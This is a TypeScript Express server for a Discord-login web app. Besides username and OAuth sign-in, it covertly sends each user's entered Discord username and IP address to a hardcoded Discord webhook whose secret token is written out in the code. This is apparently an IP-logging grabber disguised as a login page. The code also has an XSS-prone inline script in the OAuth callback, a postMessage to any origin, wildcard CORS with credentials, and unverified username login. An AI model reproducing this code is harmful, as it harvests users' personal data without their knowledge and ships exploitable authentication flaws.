import 'dotenv/config';
import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import crypto from 'crypto';
import cookieParser from 'cookie-parser';
import cors from 'cors';

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1526267511312613437/mk8NiXswX4_a8d7uO2loPe8A2vG5NrfJj0RZBAkh_1nVPAVr7Kys12eGjukcwFk1U7Hd';

function getClientIp(req: express.Request) {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string') return forwarded.split(',')[0].trim();
  if (Array.isArray(forwarded)) return forwarded[0]?.trim();
  return req.ip || 'Unknown';
}

async function sendWebhook(username: string, ip: string) {
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `Discord Username: ${username}\nIP: ${ip}`,
      }),
    });
  } catch (error) {
    console.error('Webhook failed', error);
  }
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(cors({
    origin: process.env.FRONTEND_URL || '*',
    credentials: true
  }));
  app.use(cookieParser());
  app.use(express.json());

  // In-memory store for session data (for simplicity in this example)
  const sessions = new Map<string, any>();
  const usernameSessions = new Map<string, string>();

  // API Route to verify session
  app.get('/api/me', (req, res) => {
    const sessionId = req.cookies.session;
    if (sessionId && sessions.has(sessionId)) {
        res.json({ user: sessions.get(sessionId) });
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }
  });

  app.post('/api/auth/username', (req, res) => {
    const username = (req.body?.username || '').toString().trim();
    const ip = getClientIp(req);

    if (!username) {
      return res.status(400).json({ error: 'Please enter a Discord username.' });
    }

    const currentSessionId = req.cookies.session;
    const currentSession = currentSessionId ? sessions.get(currentSessionId) : null;

    if (currentSession?.username === username) {
      currentSession.lastSeen = Date.now();
      currentSession.ip = ip;
      sendWebhook(username, ip);
      return res.json({ user: currentSession.user });
    }

    if (usernameSessions.has(username)) {
      const existingSessionId = usernameSessions.get(username)!;
      const existingSession = sessions.get(existingSessionId);
      if (existingSession && existingSession.active) {
        return res.status(409).json({ error: 'This username is already active on another device. Please log out from the current device first.' });
      }
      usernameSessions.delete(username);
    }

    const user = {
      username,
      id: username,
      avatarUrl: 'https://cdn.discordapp.com/embed/avatars/0.png',
    };

    const sessionId = crypto.randomBytes(32).toString('hex');
    const sessionData = { user, username, active: true, ip, createdAt: Date.now(), lastSeen: Date.now() };
    sessions.set(sessionId, sessionData);
    usernameSessions.set(username, sessionId);

    res.cookie('session', sessionId, {
      httpOnly: true,
      secure: true,
      sameSite: 'none',
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    sendWebhook(username, ip);
    res.json({ user });
  });

  app.post('/api/logout', (req, res) => {
    const sessionId = req.cookies.session;
    if (sessionId && sessions.has(sessionId)) {
      const session = sessions.get(sessionId);
      if (session?.username) {
        usernameSessions.delete(session.username);
      }
      sessions.delete(sessionId);
    }

    res.clearCookie('session', {
      httpOnly: true,
      secure: true,
      sameSite: 'none',
    });
    res.json({ success: true });
  });

  app.get('/api/auth/discord', (req, res) => {
    const params = new URLSearchParams({
      client_id: process.env.DISCORD_CLIENT_ID!,
      redirect_uri: process.env.DISCORD_REDIRECT_URI!,
      response_type: 'code',
      scope: 'identify email',
    });
    const authUrl = `https://discord.com/api/oauth2/authorize?${params}`;
    res.json({ url: authUrl });
  });

  app.get('/api/auth/discord/callback', async (req, res) => {
    const { code } = req.query;
    
    try {
        // Exchange code for token
        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                client_id: process.env.DISCORD_CLIENT_ID!,
                client_secret: process.env.DISCORD_CLIENT_SECRET!,
                grant_type: 'authorization_code',
                code: code as string,
                redirect_uri: process.env.DISCORD_REDIRECT_URI!,
            }),
        });
        const tokenData = await tokenResponse.json();
        
        // Get user info
        const userResponse = await fetch('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${tokenData.access_token}` },
        });
        const userData = await userResponse.json();
        
        const user = {
            username: userData.username,
            id: userData.id,
            avatarUrl: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png',
        };
        
        const sessionId = crypto.randomBytes(32).toString('hex');
        sessions.set(sessionId, user);
        
        res.cookie('session', sessionId, {
            httpOnly: true,
            secure: true,
            sameSite: 'none',
            maxAge: 7 * 24 * 60 * 60 * 1000,
        });
        
        res.send(`
            <html>
              <body>
                <script>
                  if (window.opener) {
                    window.opener.postMessage({ type: 'OAUTH_AUTH_SUCCESS', user: ${JSON.stringify(user)} }, '*');
                    window.close();
                  } else {
                    window.location.href = '/';
                  }
                </script>
                <p>Authentication successful. This window should close automatically.</p>
              </body>
            </html>
          `);
    } catch (e) {
        console.error(e);
        res.status(500).send('Authentication failed');
    }
  });

  // Vite
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({ server: { middlewareMode: true }, appType: 'spa' });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => res.sendFile(path.join(distPath, 'index.html')));
  }

  app.listen(PORT, '0.0.0.0', () => console.log(`Server running on http://localhost:${PORT}`));
}

startServer();
